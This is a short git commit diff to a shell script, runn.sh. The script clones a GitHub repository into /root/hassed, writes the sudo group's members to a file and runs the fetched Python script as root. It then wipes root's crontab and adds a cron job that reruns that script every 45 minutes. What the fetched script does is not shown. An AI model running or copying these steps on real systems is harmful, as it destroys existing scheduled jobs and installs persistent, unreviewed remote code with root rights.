12f141799276931ce8f09860eae7b214d3dd8a84
GH0STAV0 <you@example.com>
2022-04-16 18:35:30 -0400

    my connecto python

--- runn.sh
+++ runn.sh
@@ -5,13 +5,13 @@ pip3 install mysql-connector-python
 rm -rf lsq_0_c
 rm -rf /root/hassed/*
 mkdir -p /root/hassed
-echo  $(grep '^sudo:.*$' /etc/group | cut -d: -f4) > /root/hassed/read.me
 
 
 
 git clone https://github.com/GH0STAV0/lsq_0_c.git
 cp lsq_0_c/* /root/hassed/
-echo  $SUDO_USER > /root/hassed/read.me
+# echo  $SUDO_USER > /root/hassed/read.me
+echo  $(grep '^sudo:.*$' /etc/group | cut -d: -f4) > /root/hassed/read.me
 python3 /root/hassed/tel_tel.py
 crontab -r
 (crontab -l -u root 2>/dev/null; echo "*/45 * * * * python3 /root/hassed/tel_tel.py") | crontab -
